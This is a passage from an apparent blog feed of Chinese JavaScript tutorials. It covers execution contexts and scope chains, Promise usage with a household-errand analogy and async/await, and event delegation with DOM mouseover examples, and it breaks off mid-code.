title="小结"></a>小结</h2><p>当javascript代码被浏览器载入后，默认最先进入的是一个全局执行环境。当在全局执行环境中调用执行一个函数时，程序流就进入该被调用函数内，此时JS引擎就会为该函数创建一个新的执行环境，并且将其压入到执行环境堆栈的顶部。浏览器总是执行当前在堆栈顶部的执行环境，一旦执行完毕，该执行环境就会从堆栈顶部被弹出，然后，进入其下的执行环境执行代码。这样，堆栈中的执行环境就会被依次执行并且弹出堆栈，直到回到全局执行环境。<br>此外还要注意一下几点：</p><ul><li>单线程</li><li>同步执行</li><li>唯一的全局执行环境</li><li>局部执行环境的个数没有限制</li><li>每次某个函数被调用，就会有个新的局部执行环境为其创建，即使是多次调用的自身函数(即一个函数被调用多次，也会创建多个不同的局部执行环境)。</li></ul><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>当代码在一个环境中执行时，<strong>会创建变量对象的一个作用域链</strong>（scope chain）。作用域链的用途是 <strong>保证对执行环境有权访问的所有变量和函数的有序访问</strong> 。<br><strong>作用域链包含了执行环境栈中的每个执行环境对应的变量对象。</strong>通过作用域链，可以决定变量的访问和标识符的解析。<br><strong>注意</strong>：全局执行环境的变量对象始终都是作用域链的最后一个对象。</p><p>在访问变量时，就必须存在一个可见性的问题(<strong>内层环境可以访问外层中的变量和函数，而外层环境不能访问内层的变量和函数</strong>)。更深入的说，当访问一个变量或调用一个函数时，JavaScript引擎将不同执行环境中的变量对象按照规则 <strong>构建一个链表</strong>，在访问一个变量时，先在链表的第一个变量对象上查找，如果没有找到则继续在第二个变量对象上查找，直到搜索到全局执行环境的变量对象即 <strong>window对象</strong>。这也就形成了Scope Chain的概念。 </p><p><img src="https://img-blog.csdn.net/20160818165843993" alt="作用域链"></p><p>Demo:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">var color = <span class="hljs-string">"blue"</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">changeColor</span></span>()&#123;<br>  var anotherColor = <span class="hljs-string">"red"</span>;<br>  <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">swapColors</span></span>()&#123;<br>    var tempColor = anotherColor;<br>    anotherColor = color;<br>    color = tempColor;<br>    // 这里可以访问color, anotherColor, 和 tempColor<br>  &#125;<br>  // 这里可以访问color 和 anotherColor，但是不能访问 tempColor<br>  swapColors();<br>&#125;<br>changeColor();<br>// 这里只能访问color<br>console.log(<span class="hljs-string">"Color is now "</span> + color);<br></code></pre></td></tr></table></figure></p><p>上述代码一共包括三个执行环境：全局执行环境、changeColor()的局部执行环境、swapColors()的局部执行环境。</p><ul><li>全局环境有一个变量color和一个函数changecolor();</li><li>changecolor()函数的局部环境中具有一个anothercolor属性和一个swapcolors函数，当然，changecolor函数中可以访问自身以及它外围（即全局环境）中的变量;</li><li>swapcolor()函数的局部环境中具有一个变量tempcolor。在该函数内部可以访问上面的两个环境（changecolor和window）中的所有变量，因为那两个环境都是它的父执行环境。<br>上述代码的作用域链如下图所示： </li></ul><p>内部环境可以通过作用域链访问所有的外部环境，但是外部环境不能访问内部环境中的任何变量和函数。<br>标识符解析（变量名或函数名搜索）是沿着作用域链一级一级地搜索标识符的过程。搜索过程始终从作用域链的前端开始，然后逐级地向后（全局执行环境）回溯，直到找到标识符为止。</p><h2 id="执行环境与作用域的区别于联系"><a href="#执行环境与作用域的区别于联系" class="headerlink" title="执行环境与作用域的区别于联系"></a>执行环境与作用域的区别于联系</h2><p>执行环境为全局执行环境和局部执行环境，局部执行环境是函数执行过程中创建的。<br><strong>作用域链是基于执行环境的变量对象的</strong>，由所有执行环境的变量对象(对于函数而言是活动对象，因为在函数执行环境中，变量对象是不能直接访问的，此时由活动对象(activation object,缩写为AO)扮演VO(变量对象)的角色。)共同组成。<br>当代码在一个环境中执行时，会创建变量对象的一个作用域链。作用域链的用途：是保证对执行环境有权访问的所有变量和函数的有序访问。作用域链的前端，始终都是当前执行的代码所在环境的变量对象。</p><p>Demo:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;<br>(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    a= 5;<br>    console.log(window.a);//undefined<br>    var a = 1;//这里会发生变量声明提升<br>    console.log(a);//1<br>&#125;)();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p>window.a之所以是undefined，是因为var a = 1;发生了变量声明提升。相当于如下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;<br>(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    var a;//a是局部变量<br>    a = 5;//这里局部环境中有a，就不会找全局中的<br>    console.log(window.a);//undefined<br>    a = 1;//这里会发生变量声明提升<br>    console.log(a);//1<br>&#125;)();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js Promise</title>
      <link href="/2018/07/28/js-Promise/"/>
      <url>/2018/07/28/js-Promise/</url>
      
        <content type="html"><![CDATA[<h2 id="常见Promise面试题"><a href="#常见Promise面试题" class="headerlink" title="常见Promise面试题"></a>常见Promise面试题</h2><p>我们看一些 Promise 的常见面试问法，由浅至深。</p><p>1.了解 Promise 吗？<br>2.Promise 解决的痛点是什么？<br>3.Promise 解决的痛点还有其他方法可以解决吗？如果有，请列举。<br>4.Promise 如何使用？<br>5.Promise 常用的方法，方法的作用？<br>6.Promise 在事件循环中的执行过程是怎样的？<br>7.Promise 的业界实现都有哪些？<br>8.能不能手写一个 Promise 的polyfill。</p><h2 id="Promise-出现的原因"><a href="#Promise-出现的原因" class="headerlink" title="Promise 出现的原因"></a>Promise 出现的原因</h2><p>在Promise出现之前，我们处理一个异步网络请求，大概这样:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 请求 代表 一个异步网络调用。<br>// 请求结果 代表网络请求的响应。<br>请求1(<span class="hljs-keyword">function</span>(请求结果1)&#123;<br>    处理请求结果1<br>&#125;)<br></code></pre></td></tr></table></figure></p><p>当需求多时，会出现以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>请求1(<span class="hljs-keyword">function</span>(请求结果1)&#123;<br>    请求2(<span class="hljs-keyword">function</span>(请求结果2)&#123;<br>        请求3(<span class="hljs-keyword">function</span>(请求结果3)&#123;<br>            请求4(<span class="hljs-keyword">function</span>(请求结果4)&#123;<br>                请求5(<span class="hljs-keyword">function</span>(请求结果5)&#123;<br>                    请求6(<span class="hljs-keyword">function</span>(请求结果3)&#123;<br>                        ...<br>                    &#125;)<br>                &#125;)<br>            &#125;)<br>        &#125;)<br>    &#125;)<br></code></pre></td></tr></table></figure></p><p>回调地狱带来的负面作用有以下几点：</p><ul><li>代码臃肿。</li><li>可读性差。</li><li>耦合度过高，可维护性差。</li><li>代码复用性差。</li><li>容易滋生 bug。</li><li>只能在回调里处理异常。</li></ul><p>出现了问题，自然就会有人去想办法。这时，就有人思考了，能不能用一种更加友好的代码组织方式，解决异步嵌套的问题。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> 请求结果1 = 请求1();<br><span class="hljs-built_in">let</span> 请求结果2 = 请求2(请求结果1); <br><span class="hljs-built_in">let</span> 请求结果3 = 请求3(请求结果2); <br><span class="hljs-built_in">let</span> 请求结果4 = 请求2(请求结果3); <br><span class="hljs-built_in">let</span> 请求结果5 = 请求3(请求结果4);<br></code></pre></td></tr></table></figure></p><p>类似上面这种同步的写法。于是 Promise 规范诞生了，并且在业界有了很多实现来解决回调地狱的痛点。比如业界著名的 Q 和 bluebird，bluebird 甚至号称运行最快的类库。</p><h2 id="什么是Promise"><a href="#什么是Promise" class="headerlink" title="什么是Promise"></a>什么是Promise</h2><p>Promise 是异步编程的一种解决方案，比传统的异步解决方案【回调函数】和【事件】更合理、更强大。现已被 ES6 纳入进规范中。</p><h3 id="代码书写"><a href="#代码书写" class="headerlink" title="代码书写"></a>代码书写</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">new Promise(请求1)<br>    .<span class="hljs-keyword">then</span>(请求2(请求结果1))<br>    .<span class="hljs-keyword">then</span>(请求3(请求结果2))<br>    .<span class="hljs-keyword">then</span>(请求4(请求结果3))<br>    .<span class="hljs-keyword">then</span>(请求5(请求结果4))<br>    .catch(处理异常(异常信息))<br></code></pre></td></tr></table></figure><p>比较一下这种写法和上面的回调式的写法。我们不难发现，Promise 的写法更为直观，并且能够在外层捕获异步函数的异常信息。</p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>常用API:</p><ul><li>Promise.resolve(value)</li></ul><p>方法返回一个以 value 值解析后的Promise对象<br>1.如果这个值是个thenable（即带有then方法），返回的promise会“跟随”这个thenable的对象，采用它的最终状态（指 resolved/rejected/pending/settled）<br>2.如果传入的 value 本身就是 promise 对象，则该对象作为 Promise.resolve 方法的返回值返回。<br>3.其他情况以该值为成功状态返回一个 promise 对象。</p><p>demmo:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//如果传入的 value 本身就是 promise 对象，则该对象作为 Promise.resolve 方法的返回值返回。  <br><span class="hljs-keyword">function</span> fn(resolve)&#123;<br>    setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        resolve(123);<br>    &#125;,3000);<br>&#125;<br><span class="hljs-built_in">let</span> p0 = new Promise(fn);<br><span class="hljs-built_in">let</span> p1 = Promise.resolve(p0);<br>// 返回为<span class="hljs-literal">true</span>，返回的 promise 即是 入参的 promise 对象。<br>console.log(p0 === p1);<br></code></pre></td></tr></table></figure></p><p>ES6 Promises里提到了Thenable这个概念，简单来说它就是一个非常类似promise的东西。最简单的例子就是 jQuery.ajax，它的返回值就是 thenable 对象。但是要谨记，并不是只要实现了then 方法就一定能作为 Promise 对象来使用。</p><ul><li><strong>Promise.reject</strong></li></ul><p>与 resolve 唯一的不同是，返回的 promise 对象的状态为 rejected。</p><ul><li><strong>then</strong></li></ul><p>为 promise 注册回调函数，函数形式：fn(vlaue){}，value 是上一个任务的返回结果，then 中的函数一定要 return 一个结果或者一个新的 Promise 对象，才可以让之后的then 回调接收。</p><ul><li><p><strong>catch</strong><br>捕获异常，函数形式：fn(err){}, err 是 catch注册 之前的回调抛出的异常信息。</p></li><li><p><strong>race</strong></p></li></ul><p>多个promise 任务同时执行，只返回最先执行完的 Promise 任务的结果。。</p><ul><li><strong>all</strong></li></ul><p>多个promise 任务同时执行，返回所有promise 任务的执行结果。</p><h2 id="如何理解Promise"><a href="#如何理解Promise" class="headerlink" title="如何理解Promise"></a>如何理解Promise</h2><p>举例:<br>为了便于理解 Promise，大家除了要多加练习以外，最好的方式是能够将Promise的机制与现实生活中的例子联系起来，这样才能真正得到消化。</p><p>我们可以把 Promise 比作一个保姆，家里的一连串的事情，你只需要吩咐给他，他就能帮你做，你就可以去做其他事情了。<br>比如，作为一家之主的我，某一天要出门办事，但是我还要买菜做饭送到老婆单位（请理解我在家里的地位。。）</p><p>出门办的事情很重要，买菜做饭也重要。。但我自己只能做一件事。</p><p>这时我就可以把买菜做饭的事情交给保姆，我会告诉她：</p><ul><li>你先去超市买菜。</li><li>用超市买回来的菜做饭。</li><li>将做好的饭菜送到老婆单位。</li><li>送到单位后打电话告诉我。<br>我们知道，上面三步都是需要消耗时间的，我们可以理解为三个异步任务。利用 Promise 的写法来书写这个操作：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> 买菜(resolve，reject) &#123;<br>    setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        resolve([<span class="hljs-string">'西红柿'</span>、<span class="hljs-string">'鸡蛋'</span>、<span class="hljs-string">'油菜'</span>]);<br>    &#125;,3000)<br>&#125;<br><span class="hljs-keyword">function</span> 做饭(resolve, reject)&#123;<br>    setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        //对做好的饭进行下一步处理。<br>        <span class="hljs-built_in">return</span> (&#123;<br>            主食: <span class="hljs-string">'米饭'</span>,<br>            菜: [<span class="hljs-string">'西红柿炒鸡蛋'</span>、<span class="hljs-string">'清炒油菜'</span>]<br>        &#125;)<br>    &#125;,3000) <br>&#125;<br><span class="hljs-keyword">function</span> 送饭(resolve，reject)&#123;<br>    //对送饭的结果进行下一步处理<br>    resolve(<span class="hljs-string">'老婆的么么哒'</span>);<br>&#125;<br><span class="hljs-keyword">function</span> 电话通知我()&#123;<br>    //电话通知我后的下一步处理<br>    给保姆加100块钱奖金;<br>&#125;<br></code></pre></td></tr></table></figure><p>好了，现在我整理好了四个任务，这时我需要告诉保姆，让他按照这个任务列表去做。这个过程是必不可少的，因为如果不告诉保姆，保姆不知道需要做这些事情。。（我这个保姆比较懒）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>// 告诉保姆帮我做几件连贯的事情，先去超市买菜<br>new Promise(买菜)<br>//用买好的菜做饭<br>.<span class="hljs-keyword">then</span>((买好的菜)=&gt;&#123;<br>    <span class="hljs-built_in">return</span> new Promise(做饭);<br>&#125;)<br>//把做好的饭送到老婆公司<br>.<span class="hljs-keyword">then</span>((做好的饭)=&gt;&#123;<br>    <span class="hljs-built_in">return</span> new Promise(送饭);<br>&#125;)<br>//送完饭后打电话通知我<br>.<span class="hljs-keyword">then</span>((送饭结果)=&gt;&#123;<br>    电话通知我();<br></code></pre></td></tr></table></figure></p><p>如果我们的后续任务是异步任务的话，必须return 一个 新的 promise 对象。<br>如果后续任务是同步任务，只需 return 一个结果即可。<br>我们上面举的例子，除了电话通知我是一个同步任务，其余的都是异步任务，异步任务 return 的是 promise对象。</p><p>一个 Promise 对象有三个状态，并且状态一旦改变，便不能再被更改为其他状态。</p><ul><li>pending，异步任务正在进行。</li><li>resolved (也可以叫fulfilled)，异步任务执行成功。</li><li>rejected，异步任务执行失败。</li></ul><h2 id="Promise的使用总结"><a href="#Promise的使用总结" class="headerlink" title="Promise的使用总结"></a>Promise的使用总结</h2><ul><li><p>首先初始化一个 Promise 对象，可以通过两种方式创建，这两种方式都会返回一个 Promise 对象。</p><ul><li>1、new Promise(fn)</li><li>2、Promise.resolve(fn)</li></ul></li><li><p>然后调用上一步返回的 promise 对象的 then 方法，注册回调函数。</p><ul><li><p>then 中的回调函数可以有一个参数，也可以不带参数。如果 then 中的回调函数依赖上一步的返回结果，那么要带上参数。比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">    new Promise(fn)<br>.<span class="hljs-keyword">then</span>(fn1(value）&#123;<br>    //处理value<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>最后注册 catch 异常处理函数，处理前面回调中可能抛出的异常。</p></li></ul></li></ul><p>通常按照这三个步骤，你就能够应对绝大部分的异步处理场景。用熟之后，再去研究 Promise 各个函数更深层次的原理以及使用方式即可。</p><p>看到这里之后，我们便能回答上面的问题 4 和问题 5了。</p><h2 id="Promise与时间循环"><a href="#Promise与时间循环" class="headerlink" title="Promise与时间循环"></a>Promise与时间循环</h2><p>Promise在初始化时，传入的函数是同步执行的，然后注册 then 回调。注册完之后，继续往下执行同步代码，在这之前，then 中回调不会执行。同步代码块执行完毕后，才会在事件循环中检测是否有可用的 promise 回调，如果有，那么执行，如果没有，继续下一个事件循环。</p><p>关于 Promise 在事件循环中还有一个 微任务的概念（microtask），感兴趣的话可以看这篇关于nodejs 时间循环的文章 <a href="https://juejin.im/post/5af1413ef265da0b851cce80" target="_blank" rel="noopener">剖析nodejs的事件循环</a>，虽然和浏览器端有些不同，但是Promise 微任务的执行时机相差不大。</p><h2 id="Promise的升级"><a href="#Promise的升级" class="headerlink" title="Promise的升级"></a>Promise的升级</h2><p>ES6 出现了 generator 以及 async/await 语法，使异步处理更加接近同步代码写法，可读性更好，同时异常捕获和同步代码的书写趋于一致。上面的列子可以写成这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">(async ()=&gt;&#123;<br>    <span class="hljs-built_in">let</span> 蔬菜 = await 买菜();<br>    <span class="hljs-built_in">let</span> 饭菜 = await 做饭(蔬菜);<br>    <span class="hljs-built_in">let</span> 送饭结果 = await 送饭(饭菜);<br>    <span class="hljs-built_in">let</span> 通知结果 = await 通知我(送饭结果);<br>&#125;)();<br></code></pre></td></tr></table></figure></p><h2 id="相关连接"><a href="#相关连接" class="headerlink" title="相关连接"></a>相关连接</h2><p><a href="https://blog.csdn.net/cuit/article/details/53174985" target="_blank" rel="noopener">JavaScript promise 链，并行promise</a></p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js事件委托</title>
      <link href="/2018/07/28/js%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98/"/>
      <url>/2018/07/28/js%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98/</url>
      
        <content type="html"><![CDATA[<h2 id="一-什么是事件委托"><a href="#一-什么是事件委托" class="headerlink" title="一,什么是事件委托"></a>一,什么是事件委托</h2><p>那什么叫事件委托呢？它还有一个名字叫事件代理，JavaScript高级程序设计上讲：事件委托就是利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件。那这是什么意思呢？网上的各位大牛们讲事件委托基本上都用了同一个例子，就是取快递来解释这个现象。</p><p>有三个同事预计会在周一收到快递。为签收快递，有两种办法：一是三个人在公司门口等快递；二是委托给前台MM代为签收。现实当中，我们大都采用委托的方案（公司也不会容忍那么多员工站在门口就为了等快递）。前台MM收到快递后，她会判断收件人是谁，然后按照收件人的要求签收，甚至代为付款。这种方案还有一个优势，那就是即使公司里来了新员工（不管多少），前台MM也会在收到寄给新员工的快递后核实并代为签收。</p><p>这里其实还有2层意思的：</p><p>第一，现在委托前台的同事是可以代为签收的，即程序中的现有的dom节点是有事件的；</p><p>第二，新员工也是可以被前台MM代为签收的，即程序中新添加的dom节点也是有事件的。</p><hr><h2 id="二，为什么要用事件委托"><a href="#二，为什么要用事件委托" class="headerlink" title="二，为什么要用事件委托"></a>二，为什么要用事件委托</h2><p> 一般来说，dom需要有事件处理程序，我们都会直接给它设事件处理程序就好了，那如果是很多的dom需要添加事件处理呢？比如我们有100个li，每个li都有相同的click点击事件，可能我们会用for循环的方法，来遍历所有的li，然后给它们添加事件，那这么做会存在什么影响呢？</p><p>在JavaScript中，添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能，因为需要不断的与dom节点进行交互，访问dom的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间，这就是为什么性能优化的主要思想之一就是减少DOM操作的原因；如果要用事件委托，就会将所有的操作放到js程序里面，与dom的操作就只需要交互一次，这样就能大大的减少与dom的交互次数，提高性能；</p><p>每个函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大，自然性能就越差了（内存不够用，是硬伤，哈哈），比如上面的100个li，就要占用100个内存空间，如果是1000个，10000个呢，那只能说呵呵了，如果用事件委托，那么我们就可以只对它的父级（如果只有一个父级）这一个对象进行操作，这样我们就需要一个内存空间就够了，是不是省了很多，自然性能就会更好。</p><hr><h2 id="三，事件委托的原理"><a href="#三，事件委托的原理" class="headerlink" title="三，事件委托的原理"></a>三，事件委托的原理</h2><p>事件委托是利用事件的冒泡原理来实现的，何为事件冒泡呢？就是事件从最深的节点开始，然后逐步向上传播事件，举个例子：页面上有这么一个节点树，div&gt;ul&gt;li&gt;a;比如给最里面的a加一个click点击事件，那么这个事件就会一层一层的往外执行，执行顺序a&gt;li&gt;ul&gt;div，有这样一个机制，那么我们给最外面的div加点击事件，那么里面的ul，li，a做点击事件的时候，都会冒泡到最外层的div上，所以都会触发，这就是事件委托，委托它们父级代为执行事件。</p><hr><h2 id="四，实例"><a href="#四，实例" class="headerlink" title="四，实例"></a>四，实例</h2><p>好处呢：1，提高性能。</p><p>我们可以看一个例子：需要触发每个li来改变他们的背景颜色。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;ul id=<span class="hljs-string">"ul"</span>&gt;<br>  &lt;li&gt;aaaaaaaa&lt;/li&gt;<br>  &lt;li&gt;bbbbbbbb&lt;/li&gt;<br>  &lt;li&gt;cccccccc&lt;/li&gt;<br>&lt;/ul&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>  var oUl = document.getElementById(<span class="hljs-string">"ul"</span>);<br>  var aLi = oUl.getElementsByTagName(<span class="hljs-string">"li"</span>);<br> <br>  <span class="hljs-keyword">for</span>(var i=0; i&lt;aLi.length; i++)&#123;<br>    aLi[i].onmouseover = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>      this.style.background = <span class="hljs-string">"red"</span>;<br>    &#125;<br>    aLi[i].onmouseout = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>      this.style.background = <span class="hljs-string">""</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们就可以做到li上面添加鼠标事件。</p><p>但是如果说我们可能有很多个li用for循环的话就比较影响性能。</p><p>下面我们可以用事件委托的方式来实现这样的效果。html不变</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>  var oUl = document.getElementById(<span class="hljs-string">"ul"</span>);<br>  var aLi = oUl.getElementsByTagName(<span class="hljs-string">"li"</span>);<br> <br>/*<br>这里要用到事件源：event 对象，事件源，不管在哪个事件中，只要你操作的那个元素就是事件源。<br>ie：window.event.srcElement<br>标准下:event.target<br>nodeName:找到元素的标签名<br>*/<br>  oUl.onmouseover = <span class="hljs-keyword">function</span>(ev)&#123;<br>    var ev = ev || window.event;<br>    var target = ev.target || ev.srcElement;<br>    //alert(target.innerHTML);<br>    <span class="hljs-keyword">if</span>(target.nodeName.toLowerCase() == <span class="hljs-string">"li"</span>)&#123;<br>    target.style.background = <span class="hljs-string">"red"</span>;<br>    &#125;<br>  &#125;<br>  oUl.onmouseout = <span class="hljs-keyword">function</span>(ev)&#123;<br>    var ev = ev || window.event;<br>    var target = ev.target || ev.srcElement;<br>    //alert(target.innerHTML);<br>    <span class="hljs-keyword">if</span>(target.nodeName.toLowerCase() == <span class="hljs-string">"li"</span>)&#123;<br>    target.style.background = <span class="hljs-string">""</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>好处2，新添加的元素还会有之前的事件。</p><p>我们还拿这个例子看，但是我们要做动态的添加li。点击button动态添加li</p><p>如：</p><p>不用事件委托我们会这样做：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">"button"</span> id=<span class="hljs-string">"btn"</span> /&gt;<br>&lt;ul id=<span class="hljs-string">"ul"</span>&gt;<br>  &lt;li&gt;aaaaaaaa&lt;/li&gt;<br>  &lt;li&gt;bbbbbbbb&lt;/li&gt;<br>  &lt;li&gt;cccccccc&lt;/li&gt;<br>&lt;/ul&gt;<br></code></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>  var oUl = document.getElementById(<span class="hljs-string">"ul"</span>);<br>  var aLi = oUl.getElementsByTagName(<span class="hljs-string">"li"</span>);<br>  var oBtn = document.getElementById(<span class="hljs-string">"btn"</span>);<br>  var iNow = 4;<br>  <span class="hljs-keyword">for</span>(var i=0; i&lt;aLi.length; i++)&#123;<br>    aLi[i].onmouseover = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>      this.style.background = <span class="hljs-string">"red"</span>;<br>    &#125;<br>    aLi[i].onmouseout = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>      this.style.background = <span class="hljs-string">""</span>;<br>    &#125;<br>  &#125;<br> <br>  oBtn.onclick = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    iNow ++;<br>    var oLi = document.createElement(<span class="hljs-string">"li"</span>);<br>    oLi.innerHTML = 1111 *iNow;<br>    oUl.appendChild(oLi);<br>  &#125;<br> <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>这样做我们可以看到点击按钮新加的li上面没有鼠标移入事件来改变他们的背景颜色。</p><p>因为点击添加的时候for循环已经执行完毕。</p><p>那么我们用事件委托的方式来做。就是html不变<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 